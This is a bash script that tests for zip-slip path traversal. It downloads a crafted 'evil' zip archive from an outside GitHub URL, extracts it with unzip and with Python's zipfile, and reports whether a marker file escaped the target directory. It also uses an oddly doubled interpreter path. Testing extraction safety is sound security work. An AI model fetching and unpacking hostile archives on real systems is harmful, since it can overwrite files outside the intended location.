#!/usr/bin/env bash
echo "=== P1 UNZIP TRAVERSAL TEST ==="
echo "TIME=$(date +%H:%M:%S.%3N)"
TMPDIR=/tmp/p1test_$$
mkdir -p "$TMPDIR/unzip_dir"

echo "--- download evil zip ---"
curl -sf --max-time 20 "https://raw.githubusercontent.com/v-vlasenko/base/master/fake-registry/evil-0.0.1.zip" \
  -o "$TMPDIR/evil.zip" && echo "download OK" || echo "download FAILED"

echo "--- unzip -v to list entries ---"
unzip -v "$TMPDIR/evil.zip" 2>&1

echo "--- unzip to unzip_dir (NO -: flag) ---"
unzip "$TMPDIR/evil.zip" -d "$TMPDIR/unzip_dir" 2>&1

echo "--- tree of extraction result ---"
find "$TMPDIR" -mindepth 1 | sort 2>&1

echo "--- did traversal escape? ---"
if [ -f "$TMPDIR/providers/zipslip_CONFIRMED.txt" ]; then
  echo "TRAVERSAL: file at TMPDIR/providers/ (relative escape)"
  cat "$TMPDIR/providers/zipslip_CONFIRMED.txt"
elif [ -f "$TMPDIR/unzip_dir/providers/zipslip_CONFIRMED.txt" ]; then
  echo "SAFE: stripped to unzip_dir/providers/ (no escape)"
  cat "$TMPDIR/unzip_dir/providers/zipslip_CONFIRMED.txt"
else
  echo "UNKNOWN: neither found"
fi

echo "--- test python 3.13 zipfile extractall ---"
/usr/bin/runner/usr/bin/python3 -c "
import zipfile, pathlib, tempfile, os
dest = pathlib.Path('$TMPDIR') / 'py_extract'
dest.mkdir()
try:
    with zipfile.ZipFile('$TMPDIR/evil.zip', 'r') as z:
        z.extractall(dest)
    extracted = list(dest.rglob('*'))
    for f in sorted(extracted):
        print(f.relative_to(dest))
    if (dest / 'providers' / 'zipslip_CONFIRMED.txt').exists():
        print('PYTHON TRAVERSAL: escaped to providers/')
    elif (pathlib.Path('$TMPDIR') / 'providers' / 'zipslip_CONFIRMED.txt').exists():
        print('PYTHON TRAVERSAL: escaped outside TMPDIR')
    else:
        print('PYTHON SAFE: no traversal escape')
except Exception as e:
    print('PYTHON ERROR:', type(e).__name__, str(e))
" 2>&1

rm -rf "$TMPDIR"
echo "=== DONE ==="
